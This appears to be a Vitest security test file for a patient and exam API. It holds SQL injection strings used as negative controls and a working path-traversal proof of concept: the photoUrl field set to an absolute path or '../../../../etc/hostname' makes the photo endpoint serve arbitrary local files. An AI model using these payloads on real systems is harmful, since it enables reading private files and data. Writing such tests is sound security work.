// PoC — SQL/raw-injection negative controls + storage-ref path traversal (photoUrl).
// Restaura o storage REAL (setup.ts mocka) porque o alvo é exatamente o caminho de disco.
vi.unmock('../src/utils/storage');

import fs from 'fs';
import os from 'os';
import path from 'path';
import { prisma } from '../src/prisma';
import { resetDb, createUser, createExam, api, authHeader } from './helpers';

beforeAll(async () => { await resetDb(); });
afterAll(async () => { await prisma.$disconnect(); });

describe('SQL injection — negative controls on reachable query surfaces', () => {
  it('exam list: _sort payload is allowlisted (falls back), q is parameterized', async () => {
    const u = await createUser();
    await createExam(u.patient.id, { title: `Hemograma ${Date.now()}` });
    const res = await api()
      .get('/api/exams')
      .query({ _start: '0', _end: '25', _sort: 'title;SELECT 1--', _order: 'ASC', q: "' OR '1'='1" })
      .set(authHeader(u.token));
    expect(res.status).toBe(200);
    expect(Array.isArray(res.body)).toBe(true);
    expect(JSON.stringify(res.body)).not.toContain('error');
  });

  it('admin payments filter q=SQLi stays parameterized (admin token)', async () => {
    const admin = await prisma.user.create({
      data: { email: `admin-${Date.now()}@exemplo.com`, name: 'Admin', passwordHash: 'x', role: 'ADMIN', emailVerified: true },
      select: { id: true },
    });
    const { mintToken } = await import('./helpers');
    const res = await api()
      .get('/api/admin/payments')
      .query({ q: "'; SELECT pg_sleep(5)--", status: "APPROVED' OR '1'='1" })
      .set(authHeader(mintToken(admin.id)));
    expect(res.status).toBe(200);
    expect(JSON.stringify(res.body)).not.toMatch(/pg_sleep|syntax|unterminated/i);
  });
});

describe('photoUrl storage-ref injection (utils/storage.ts resolvePatientPhoto)', () => {
  it('PUT /api/patients/:id photoUrl=ABSOLUTE PATH → GET /api/patients/:id/photo serves arbitrary local file', async () => {
    const u = await createUser();
    const marker = `POC-PHOTO-TRAVERSAL-${Date.now()}-${Math.random().toString(36).slice(2)}`;
    const secretFile = path.join(os.tmpdir(), 'poc-secret-marker.txt');
    fs.writeFileSync(secretFile, marker);

    const put = await api()
      .put(`/api/patients/${u.patient.id}`)
      .set(authHeader(u.token))
      .send({ photoUrl: secretFile });
    expect(put.status).toBe(200);

    const res = await api().get(`/api/patients/${u.patient.id}/photo?t=${u.token}`);
    expect(res.status).toBe(200);
    expect(res.text).toContain(marker);
    fs.unlinkSync(secretFile);
  });

  it('photoUrl=relative traversal ../../../../etc/hostname escapes photos dir', async () => {
    const u = await createUser();
    const put = await api()
      .put(`/api/patients/${u.patient.id}`)
      .set(authHeader(u.token))
      .send({ photoUrl: '../../../../../../../../etc/hostname' });
    expect(put.status).toBe(200);

    const res = await api().get(`/api/patients/${u.patient.id}/photo?t=${u.token}`);
    expect(res.status).toBe(200);
    expect(res.text.trim().length).toBeGreaterThan(0);
    expect(fs.readFileSync('/etc/hostname', 'utf8').trim()).toBe(res.text.trim());
  });
});